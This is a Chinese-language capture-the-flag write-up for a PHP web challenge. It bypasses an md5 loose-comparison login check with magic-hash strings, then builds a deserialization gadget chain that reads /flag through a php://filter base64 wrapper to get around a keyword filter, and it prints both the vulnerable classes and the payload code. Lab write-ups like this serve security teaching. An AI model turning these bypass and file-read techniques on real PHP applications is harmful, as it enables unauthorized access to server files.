---
title: hgamemini-mynotebook
tags: 
  - PHP 反序列化
  - PHP md5 碰撞
description: ISCTF php 一句话木马
---
# my notebook
首先查看题目
![](./img//Snipaste_2023-11-30_14-42-46.png)
让我们输入一些东西并上传，没有什么输入的头绪，我们按f12查看网页源代码，通过提示，发现可以通过爆破目录得到源码
![](./img/Snipaste_2023-11-30_14-56-58.png)
![Alt text](./img/Snipaste_2023-11-30_14-55-41.png)
![Alt text](./img/Snipaste_2023-11-30_14-49-58.png)
查看`login.php`代码，发现当` (md5($_POST['check-code-1']) == md5($_POST['check-code-2']))`
并且`$_POST['check-code-1'] == $_POST['check-code-2']`会进入`index.php`

因此我们查阅资料，参考md5这个哈希函数的知识点，md5是通过对代码进行摘要和加密形成的一段密文，所以如果是三个`=`要求类型也要一致，字符串比较很难达到相等的结果，但题目只要求两个`=`,因此发现只要传入参数a=s1885207154a，b=s1836677006a，即可
![](./img/Snipaste_2023-11-30_18-27-22.png)来到了index.php的界面，接着查看`index.php`的代码
![](./img/Snipaste_2023-11-30_18-31-22.png)
发现需要观察`get.php`和`./save.php`以及`mainlass.php`
```php
<?php
class HereWeGo{
    public $try;
    public function __destruct(){
        $this->try->gogogo();
    }
}

class GoGoGo{
    public $go;

    public function __construct($go)
    {
        $this->go = $go;
    }

    public function __call($name,$arguments){
        return $this->go->web;
    }
}

class Evil{
    public $file;
    public $final;

    public function __construct($file){
        $this->file = $file;
    }
    //The flag is in /flag
    public function __get($Attribute){
        $result = file_get_contents($this->file);
        if(preg_match('/vidar/i',$result)){
            $this->final = "HACKER!!!";
            file_put_contents('flag.txt',$this->final);
            return;
        }
        $this->final = $result;
        file_put_contents('flag.txt',$this->final);
    }
}
?>

```
观察到我们需要构造一条反序列化链，我们的目标是让代码中的`get`魔术方法被调用，从而达到把final的内容放到flag的效果。
因此，我们先来调用`get`魔术方法，要求调用不存在的成员，观察其它类中的成员发现`class GoGoGo`可以达到这个效果，要求我们先调用`__call`魔术方法。
>__call() 方法可以也只能用在类中，当调用类的对象的一个 不存在 的方法 ( 不存在或该方法不可访问 ) 时自动调用。
观察代码，发现`class HereWeGo`存在不存在的gogogo()函数，因此我们将`gogogo()`所在的`try`成员放在`GoGoGo`中，以此类推，形成一条完整的反序列化链条的构造，其中注意要反序列话都是链条的起点
```php
myEvil =new Evil('php://filter/read=convert.base64-encode/resource=/flag');
$myHereWeGo=new HereWeGo();
$myGoGoGo=new GoGoGo($myEvil);
$myHereWeGo->try=$myGoGoGo;
$a=serialize($myHereWeGo);
echo $a;
```
还要注意另一个问题，代码中要求文件开头不能是vidar，因此要利用`filter`协议进行base64编码
，上传`payload`
![](./img/Snipaste_2023-11-30_19-09-43.png)
![](./img/Snipaste_2023-11-30_19-10-13.png)
得到`flag`。